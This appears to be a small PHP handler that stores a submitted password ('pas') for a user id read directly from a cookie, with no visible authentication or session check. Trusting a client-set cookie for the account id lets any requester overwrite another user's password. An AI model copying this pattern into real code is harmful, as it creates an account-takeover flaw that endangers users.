<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$contrasena = $ifilter->process($_POST['pas']);
$id = $_COOKIE['id'];
put_pass($id,$contrasena);

?>